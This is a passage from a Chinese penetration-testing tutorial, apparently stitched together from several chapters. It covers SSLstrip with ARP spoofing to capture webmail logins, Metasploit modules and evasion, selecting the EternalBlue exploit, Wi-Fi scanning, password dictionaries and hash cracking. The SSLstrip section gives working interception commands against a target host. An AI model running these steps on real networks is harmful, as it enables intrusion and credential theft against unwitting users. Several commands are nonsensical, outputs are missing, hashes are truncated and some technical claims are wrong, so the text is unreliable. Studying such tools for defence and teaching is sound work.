root@exampleserver:～# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
```
3. 使用`SSLstrip`监控端口 10000 以获取敏感信息。执行命令如下：
```bash
root@exampleserver:～# sslstrip -a -l 10000
```
执行上述命令后，SSLstrip 工具正在运行。此时会在当前目录创建一个名为`sslstrip.log`的文件。监控日志文件查看传输的数据，执行命令如下：
```bash
root@exampleserver:～# tail -f sslstrip.log
```
**Tip：** 使用`SSLstrip`攻击时可能会出现某些警告信息，但并不影响数据的捕获。
4. 实施 ARP 欺骗。执行命令如下：
```bash
root@exampleserver:～# ettercap -M arp:remote /192.168.29.135//192.168.29.2
```
5. 此时访问被加密的网站。如果目标用户提交敏感信息，会被 SSLstrip 捕获。例如，登录`mail.126.com`邮箱，将显示登录界面。
6. 当用户成功登录后，地址栏中将是解密后的 HTTP 协议，此时用户名和密码显示如下：
```
2019-04-15 15:18:51,945 POST Data (password:126): server response: HTTP/1.1 200 OK
```
从上述输出可以看到目标主机访问了`mail.126.com`。此时，用户名是`testuser@126.com`，密码已加密。

## 什么是 Metasploit？

Metasploit 是一个免费的可下载的框架。通过它，网络安全人员可以轻松获取、挖掘和攻击计算机软件漏洞。Metasploit 框架可以用于发现漏洞、利用漏洞、提交漏洞以及执行攻击。此外，用户可以从其他漏洞扫描器导入数据，根据漏洞主机的详细信息发现可攻击的漏洞，并使用有效负载对系统发起攻击。Metasploit 框架的威力在于它提供了大量的渗透测试模块和插件。这些模块可以根据用途分为 7 类，即`Exploits`（利用模块）、`Auxiliary`（辅助模块）、`Post`（后渗透攻击模块）、`Payloads`（有效负载模块）、`Encoders`（编码器模块）、`Nops`（空指令模块）和`Evasion`（规避模块）。

---

**第 26 章：介绍 Metasploit**

Metasploit 是一个开源的安全漏洞检测工具。它可以帮助网络安全和 IT 专业人员识别安全问题、验证漏洞解决方案，并完成对目标的安全评估。该工具涵盖了各种功能，如智能开发、代码审计、Web 应用扫描和社交工程学。本节将介绍 Metasploit 的相关概念。





### 主动渗透攻击

被利用的安全漏洞位于网络服务器软件以及服务器软件承载的上层应用中。因为这些服务通常会在主机上开启一些监听端口并等待客户端连接。通过连接到目标系统的网络服务，注入某些包含“恶意”攻击数据的特殊构造网络请求内容，触发安全漏洞，并导致远程服务器执行“恶意”数据中包含的攻击载荷，从而获取目标系统的控制权限。

### 被动渗透攻击

被利用的漏洞位于客户端软件（如浏览器、浏览器插件、邮件客户端、Office 和 Adobe 以及其他文档和编辑软件）。对于此类安全漏洞，渗透测试人员无法从远程向客户端软件主动输入数据，因此只能使用被动渗透攻击。常用的被动渗透攻击包括构建“恶意”网页、电子邮件或文档文件，并通过建立包含此类恶意内容的服务器、发送邮件附件、结合社会工程学攻击分发、结合网络欺骗和劫持技术等，诱骗目标用户在目标系统上打开或访问这些恶意内容，从而触发客户端软件的安全漏洞，获取控制目标系统的 `Shell` 会话。

### 辅助模块

辅助模块包括各种网络服务的扫描和检测、构建伪造服务以收集登录密码、密码猜破解等模块。此外，辅助模块还包括一些不需要加载的攻击载荷。这些模块不用于获取目标系统的远程控制，例如拒绝服务攻击。

### 渗透后攻击模块

渗透后攻击模块主要用于获取目标系统的远程控制。在控制系统中执行各种渗透后攻击，如获取敏感信息、进一步扩展以及实施跳板攻击。

### 攻击载荷模块

攻击载荷（Attack Payload）是一段嵌入代码，用于在成功渗透攻击后提示目标系统运行。其通常功能是在目标系统上为并开启一个控制会话连接，供渗透攻击者使用。在传统的渗透代码开发中，攻击载荷仅仅是一段简单的 `ShellCode` 代码，用汇编语言编译并转换为目标系统 CPU 架构支持的机器码。渗透攻击触发漏洞后，程序执行流被劫持并跳转到这段代码中执行，从而完成 `ShellCode` 中的单一功能。Metasploit 攻击载荷分为三种类型：Single（独立型）、Stager（传输器）和 Stage（传输体）。这三种攻击载荷类型的区别如下：

*   **Single**：它是一个完全独立的载荷，使用起来就像运行 `calc.exe` 一样，例如添加系统用户或删除文件。由于 Single Payloads 是完全独立的，它们可能会被非 Metasploit 处理工具（如 `netcat`）捕获。
*   **Stager**：该载荷负责在目标用户和攻击者之间建立网络连接，并下载额外的组件或应用程序。常见的 Stager Payload 是 `reverse_tcp`，它允许目标系统与攻击者建立 TCP 连接，允许目标系统主动连接渗透测试人员的端口（反向连接）。另一个常用的是 `bind_tcp`，它允许目标系统开启 TCP 监听，攻击者可以随时与目标系统通信（正向连接）。
*   **Stage**：它是 Stager Payload 下的一种 Payload 组件，这种 Payload 可以提供更高级的功能，且没有尺寸限制。

### 空指令模块

空指令（`NOP`）是一些无操作或无关的操作指令，对程序的运行状态不会产生实质性影响。最典型的空指令是无操作。在 `X86` CPU 架构平台上，操作码为 `ox90`。当渗透攻击构建恶意数据缓冲区时，通常需要在要执行的 shell code 之前添加一个空指令区域。这样，当渗透攻击触发并执行 `ShellCode` 时，将有一个更大的安全着陆区域，避免因内存地址随机化和返回地址计算偏差导致 `ShellCode` 执行失败，提高渗透攻击的可靠性。

### 编码模块

在攻击载荷和空指令模块组装完成指令序列后，Metasploit 框架在渗透攻击模块将指令添加到恶意数据缓冲区并发送到目标系统运行之前需要进行编码。编码模块有两个主要功能：第一，确保攻击载荷中不出现“坏字符”；第二是，“释放”攻击载荷，即避免被防病毒软件、IDS 入侵检测系统和 IPS 入侵防御系统检测和拦截。

### 规避模块

规避模块是 Metasploit 5 新新增。用户可以使用规避模块规避 Windows Defender 防火墙。Windows Defender 现在 Windows 系统自带的防火墙工具，它不仅可以扫描系统，还能实时监控系统。

### 插件

插件可以扩展框架的功能，或者封装现有功能以形成高级功能的组件。插件可以集成一些现有的外部安全工具，如 `Nessus`、`OpenVAS` 漏洞扫描器等。

# 第 27 章理解 Metasploit 接口

Metasploit 框架提供了两种接口：图形界面和终端模式。以前也提供命令行模式接口，但已弃用。下面将介绍 Metasploit 的图形界面和终端模式启动方法。

### 1) Metasploit 的图形界面 (Armitage)

Armitage 是一个用 Java 编写的 Metasploit 图形界面攻击软件。它可以结合 Metasploit 中已知的漏洞实现对主机漏洞的自动化攻击。下节将介绍如何使用 Armitage。

具体步骤如下：

1.  在图形界面中，依次选择 "Applications"|"Vulnerability Exploitation Tool Set"|`armitage` 来启动 Armitage 工具。
2.  对话框显示连接 Metasploit 服务的基本信息。点击 `Connect` 按钮，将显示对话框。
3.  对话框提示是否启动 Metasploit 的 RPC 服务。点击 `Yes (Y)` 按钮，将显示对话框。

5.  如果看到此界面，说明 Armitage 工具已成功启动。接下来，用户可以使用该工具进行渗透测试。该界面分为三个部分，分别标记为 A、B 和 C。

*   **A 部分**：显示预配置模块。用户可以在模块列表中使用空格键搜索提供的模块。
*   **B 部分**：显示活跃的目标系统，用户可以执行漏洞攻击。
*   **C 部分**：显示多个 Metasploit 标签。这样你可以同时运行并显示多个 Meterpreter 命令或控制会话。




例如，为了在目标主机上实现 Nmap Ping 扫描，你可以依次选择 `Hosts|Nmap Scan|Ping Scan` 命令。在选择此界面上选择 `Ping Scan` 命令后，你就可以对目标主机执行 Ping 扫描了。

## 查询渗透测试模块
漏洞主要通过 Metasploit 的渗透测试模块实现。因此，用户需要根据漏洞寻找对应的渗透测试模块。在 Metasploit 中，你可以使用 `search` 命令快速找到渗透测试模块。用户也可以去一些第三方网站寻找渗透测试模块并将其导入到 Metasploit 中实现漏洞利用。本节将介绍如何查询渗透测试模块。

### 扫描报告预分析
用户在上一节中已成功导入了扫描报告。此时，用户可以分析扫描报告以发现目标系统中的漏洞。然后，根据漏洞寻找可以利用该漏洞的模块并实施攻击。下文将介绍预分析扫描报告的方法。
具体步骤如下：

1. **使用 `hosts` 命令查看报告的主机信息。**
执行命令如下：
```
msf5> hosts
```
从输出信息中，我们可以看到扫描报告中有 3 个主机。其中，地址分别为 `192.168.29.223`、`192.168.29.225` 和 `192.168.29.127`。

2. **使用 `vulns` 命令查看漏洞信息。**
执行命令如下：
```
msf5> vulns
```
接下来，用户可以使用 `Name` 或引用信息（`References`）来搜索可使用的攻击载荷。

### 手动寻找攻击载荷
在用户确定目标系统中的漏洞后，可以在 Metasploit 中搜索渗透测试模块，以选择可以利用其漏洞的模块，然后执行渗透测试。下文将介绍使用 `search` 命令手动搜索渗透测试模块的方法。

```
search [options]
```
在上述语句中，`options` 支持的选项；关键词意味着可用的关键词。接下来，我们将手动查找 CVE 漏洞作为渗透测试模块。
执行命令如下：
```
msf5> search cve:2020
```
从输出信息中，我们可以看到所有 2020 年发布的渗透测试模块。输出信息包含 5 列，分别代表 `Name`（名称）、`Disclosure Date`（发布日期）、`Rank`（排名）、`Check`（检查）和 `Description`（描述）。

通过上述扫描报告预分析，寻找名为 MS17-010 RCE Detection 的渗透测试模块。
执行命令如下：
```
msf5> search name:MS17-010 RCE Detection
```
从输出信息中，我们可以看到所有可以利用 MS17-010 RCE Detection 漏洞的渗透测试模块。此时，用户可以选择名为 `exploit/windows/smb/ms17_010_eternalblue` 的模块进行渗透测试。执行命令如下：
```
msf5> exploit/windows/smb/ms17_010_eternalblue

## 理解无线网络

与有线网络相比，无线网络的构建是非常简单的，只需要无线路由器和无线客户端。本节将介绍无线网络的组成。

### 无线网络的组成
通常路由器被称为 `AP` (访问点)，而无线客户端被称为 `STA` (站点)，例如手机、笔记本电脑和平板电脑。在无线网络中，至少有一个 AP 和多个客户端。

### 无线网络的工作流
当用户对无线网络有了清晰的理解，工作流分为四个步骤：

1. `AP` 定期广播 SSID，`STA` 监听该信号。当 `STA` 加入无线网络时，会发送探测请求。当 `AP` 接收请求后，`STA` 将切换到指定的频率段。
2. 随后，`STA` 提供密码来认证无线网络。如果认证信息正确，`STA` 允许访问无线网络。
3. 在关联过程中，`STA` 和 `AP` 应该协商速率，直到关联成功。
4. 此时，`STA` 和 `AP` 可以计数。无线网络的一种通用标准是由电气电子工程师学会（IEEE）制定的。虽然 Wi-Fi 经常与 802.11 混淆，但它们是相同的。如果你想渗透无线网络，必须理解 802.11 标准。下文将详细介绍 802.11 协议。

### 什么是 802.11 协议？
802.11 是 IEEE 制定的标准，主要用于局域网，最大速率只能达到 2Mbps。因为 802.11 无法满足对速度和距离的需求，IEEE 团队继引入了两个标准：802.11b 和 802.11a。它们之间的区别在于 MAC 层和物理层。

### 802.11ac 协议
802.11ac 是 802.11n 的继任者。基于 802.11a 标准，使用 5GHz 频段。802.11ac 的带宽从 20MHz 增加到 40MHz 甚至 160MHz。此外，调制效率得到了提高。最后，理论传输速度从 600Mbps 的 802.11n 跃跃到 1Gbps。实际传输速率在 300 Mbps 到 400 Mbps 之间，这足够传输视频流了。

### 2.4GHz 频段
频段是指无线信号的频率范围。无线信号在指定的频率范围内传输。2.4GHz 频段是 2400~2482MHz。为了充分利用该频段，范围被分为几个部分，每个部分被称为一个通道。目前主流 WiFi 网络支持 13 个通道。尽管它们的中心频率不同，但都会重叠。了解这些 13 个通道有助于无线网络在多个通道上运行以避免干扰。14 通道通常不使用。非重叠通道有 1、6 和 11。

### 5GHz 频段
随着时间的发展，5GHz 频段逐渐进入人们的生活。5GHz 的频率比 2.4GHz 高，波长短，因此渗透性较弱但数据传输更快。支持五个通道，分别为 149、153、157、161 和 165。当 5GHz 信号较少时，可以任意选择通道。




## 无线模式

- **托管模式（Managed mode）**：当无线客户端直接连接到无线接入点 (`WAP`) 时使用此模式。在此模式下，无线网卡的驱动依赖 `WAP` 来管理整个通信过程。
- **自自模式（Ad hoc mode）**：也称为点点模式。当用户的网络由直接连接的设备组成时使用此模式。在此模式下，通信双方共同承担 `WAP` 的职责。
- **主机模式（Master mode）**：某些高端无线网卡支持 `master mode`。此模式允许无线网卡配合特殊的驱动和软件作为其他设备的 `AP`（接入点）工作。
- **监控模式（Monitor mode）**：从用途角度来说最重要的模式。如果网络客户端不是用于发送和接收数据，而是用于监控网络中的所有数据包，那么你可以使用监控模式。

# 第 39 章：Airodump-ng 工具的使用

### 使用 Airodump-ng 工具

`Airodump-ng` 是 `Aircrack-ng` 工具集中的一个工具，可用于扫描周围的无线网络信号。通过分析捕获的无线信号包，可以获取周围开放 `AP` 的名称、`MAC` 地址、信道和加密方法。本节介绍了使用 `airodump-ng` 工具扫描无线网络的方法。

使用 `airodump-ng` 工具扫描无线网络的语法如下：

```bash
root@exampleserver: airodump scan
```

在上述语法中，参数 `interface` 指无线网卡的监听接口。

使用 `Airodump-ng` 工具扫描无线网络。执行以下命令：

```bash
root@exampleserver: airodump wireless
```

从输出信息中可以看到扫描到的无线网络信息。上述输出信息中有许多列，每个列参数的含义如下：

1. **BSSID**：指示无线 `AP` 的 `MAC` 地址。
2. **PWR**：无线网卡报告的信号强度，主要取决于 `driver`。如果 `BSSID` 和 `PWR` 均为 `-1`，则表示网卡不支持报告信号强度。
3. **Beacons**：`AP` 发送的公告包数量。每个接入点（AP）每秒发送 10 个。
4. **Data**：数据包数量（包括广播包）。
5. **s**：每秒捕获的数据包数量。
6. **Ch**：信道号（从 `Beacons` 获取）。
7. **Mb**：无线 `AP` 支持的最大速率。如果值为 `11`，表示使用了 `802.11b` 协议；如果是 `22`，表示使用了 `802.11b+` 协议；如果更高，表示使用了 `802.11g` 协议。如果值包含点（`54` 之后），表示支持短导频。如果包含 `e`，表示网络启用了 `QoS(802.11 e)`。
8. **Cipher**：检测到的加密算法为 `CCMP`、`WRAAP`、`TKIP`、`WEP` 和 `WEP104`。通常（但不一定）`TKIP` 与 `WPA` 使用，`CCMP` 与 `WPA2` 使用。如果密钥索引值大于 0，显示为 `WEP40`。标准情况下，索引 0~3 为 40 位，104 位应为 0。
9. **Auth**：使用的认证协议。常用的有 `MGT（WPA/WPA2 使用独立认证服务器，如 802.1x、radius 和 eap 等）`、`ska（WEP 共享密钥）`、`PSK（wpa/wpa2 预共享密钥）` 或 `OPN（WEP 开放）`。
10. **ESSID**：所谓的 `ssid` 。如果启用了隐藏 `SSD`，则为空或显示为 `< length: 0 >`。在这种情况下，airodump-ng 尝试从 `proberesponses` 和 `associationrequests` 获取 `SSD`。
11. **Station**：客户端的 `MAC` 地址，包括已连接客户端和想要搜索无线网络的客户端。如果客户端未连接，会在 `BSSID` 下显示 `not associated`。
12. **Rate**：指示传输速率。
13. **Lost**：基于序列号检测的过去 10 秒内丢失的数据包。这意味着从客户端发送的数据丢失了，每个非管理帧都有序列号字段。通过从刚接收帧的序列号中减去上一帧的序列号，就可以知道丢失了几个数据包。





### 14. Frames（帧数）
客户端发送的数据包数量。

### 15. probe（探测）
客户端探测的 ESSID。如果客户端正尝试连接 AP 但尚未连接，则将在此处显示。

## 创建密码字典

这里的字典是指密码字典。如果你想实施密码攻击，密码字典是必不可少的。用户可以收集并分析密码信息，来创建一个更合理的密码字典。这样做不仅可以提高破解成功率，还可以缩短破解时间。本节将介绍如何创建字典。

### 密码信息收集
在创建密码字典之前，你可以先收集密码。例如，你可以收集与目标相关的电子邮箱地址、网站博客文章、Twitter 推文、单位名称和人员姓名等信息。因为大多数用户为了方便记忆会使用最简单的密码，或者使用个人相关信息（如单位名称、门号等）作为密码。此时，如果将这些信息收集并添加到字典文件中，就可以提高破解成功率。

### 加密策略分析
密码策略是指系统对用户设置的密码施加的各种限制，例如不允许只使用数字、连续数字和英文字母等。例如，某些软件或系统会有相应的密码策略来提高其安全性。此时，用户可以通过分析这些设备的密码策略，有针对地创建密码字典。下一节将介绍密码策略分析方法。

#### 1) 软件/系统内置策略
内置策略指的是软件/系统本身内置的密码策略。为了安全，某些软件/系统具有固定策略以避免被轻易破解。如果软件/系统具有内置策略，用户在注册账户时会收到密码长度和复杂度要求的提示。
例如，在安装 Oracle 数据库时，用户会被提示设置的密码足够复杂。安装 Linux 操作系统时，会提示设置 root 用户密码。此时，用户可以通过分析软件/系统的内置策略来创建相应的策略字典。

#### 2) 强化策略
强化策略是指针对软件/系统的额外建议标准。例如，在 Windows 系统中，使用组策略来强化密码策略，允许用户设置更安全的密码。此时，用户可以使用组策略分析工具分析密码策略，然后构建一个更强大的密码字典。下一节将介绍如何使用组策略分析工具来分析密码策略。

### 3) 使用 rtgen 工具
`rtgen` 工具用于生成彩虹表（rainbow tables）。彩虹表是大量字母组合的预计算哈希值。其中生成的彩虹表包含多种算法，如 LM、NTLM、MD5、SHA1 和 SHA256。然后使用彩虹表可以快速破解各种密码。以下将介绍使用 `rtgen` 工具生成彩虹表的方法。语法格式如下：
```
rtgen hash_algorithm charset plaintext_min plaintext_max
```
上述语法中的参数含义如下：
`Hash_algorithm`: 指定使用的哈希算法。其中包含 `lm`、`ntlm`、`md5`、`sha1` 和 `sha256`。
`Charset`: 指定字符集。其中 `rtgen` 工具提供的默认字符集文件为 `/usr/share/rainbowcrack/charset.txt`，如下：
```
root@exampleserver:/usr/share/rainbowcrack# cat charset.txt
```
上述输出显示所有字符集。其中指定的最小长度为 4，最大长度为 8。执行命令如下：
```
root@exampleserver:～# rtgen md5 loweralpha 4 8 01000
```
看到上述输出意味着成功生成了基于 MD5 的彩虹表，文件名为 `md5_loweralpha#4-8_0x1000.rt`。其中彩虹表默认保存在 `/usr/share/rainbowcrack/` 目录下：
```
root@exampleserver:～# cd /usr/share/rainbowcrack/
```
从输出信息可以看出生成的表是 `md5_loweralpha#4-8_0x1000.rt`。为了方便使用生成的彩虹表，可以使用 `rtsort` 命令对其排序。执行命令如下：
```
root@exampleserver:/usr/share/rainbowcrack# rtsort
```
执行上述命令后将输出信息。接下来可以使用彩虹表进行破解。

## 破解哈希
为了避免信息泄漏造成的危害，在实际应用中，软件和系统会对密码加密后保存。常见的加密方法有各种哈希算法。这类算法可以将不同长度的密码加密为固定长度的字符串。由于加密字符串长度固定且无法直接反转，因此具有很高的安全性并被广泛使用。本节将介绍破解哈密码的方法。下节描述了如何使用 `hashid` 工具识别加密方法。当渗透测试人员确定了哈希的加密方法后，可以选择针对性的工具和方法进行破解，从而节省大量时间。例如：
```
root@exampleserver:# hashid 6bcecba2597f8
```
上述输出显示了可能的哈希方法。其中前面的哈希类型更有可能。可以推测哈希类型为 MD5。

### LM 哈希
LM (LAN Manager) 哈希是 Windows 系统最早使用的密码算法之一。以下将介绍使用 `findmyhash` 工具破解 LM 哈希。使用 `findmyhash` 的语法格式如下：
```
findmyhash OPTIONS
```
在上述语法中，参数指示密码类型。支持的算法有 MD4、MD5、SHA1、SHA256、SHA512、GOST、LM、NTLM、CISCO、JUNIPER、LDAP。`OPTIONS` 表示可用选项：
`-hash_value`: 指定破解的值。
`-f`: 指定破解列表。
`-g`: 如果哈希密码无法破解，将使用 Google 搜索。使用 `findmyhash` 工具破解 LM 哈希的原始密码。执行命令如下：
```
root@exampleserver:～# findmyhash -h 5dcc3b5aa765d1d8327deb88cf99
```
上述输出信息为密码。此时用户可以使用 `cat` 命令查看生成的字典文件如下：
```
root@exampleserver: ~ # cat
```
上述信息为生成的密码。由于章节限制，仅列出了密码。

### 直接使用哈希值
当用户无法破解哈希密码时，可以直接使用而无需破解。
